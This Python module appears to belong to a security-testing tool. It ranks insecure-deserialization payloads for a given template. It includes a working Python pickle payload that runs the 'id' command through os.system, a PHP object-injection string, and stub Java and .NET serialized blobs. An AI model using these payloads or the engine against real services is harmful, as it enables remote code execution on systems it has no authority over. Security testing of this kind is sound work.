"""Insecure-deserialization payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_deserialize_context

# Representative serialized-object payloads across runtimes.
_BODIES = [
    ("cos\nsystem\n(S'id'\ntR.", "python-pickle"),
    ('O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}', "php-object"),
    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "java-serialized"),
    ("AAEAAAD/////AAAAAAAAAAAEAQAAAA==", "dotnet-binaryformatter"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class DeserializeCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class DeserializeMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[DeserializeCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_deserialize(template: str) -> DeserializeMutationResult:
    """Generate and rank deserialization payloads for ``template``."""
    from .analyzer import analyze_deserialize

    context = analyze_deserialize_context(template)

    candidates: list[DeserializeCandidate] = []
    for payload, strategy in _BODIES:
        result = analyze_deserialize(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                DeserializeCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return DeserializeMutationResult(
        template=template,
        context=context,
        generated=len(_BODIES),
        valid=len(candidates),
        candidates=candidates,
    )
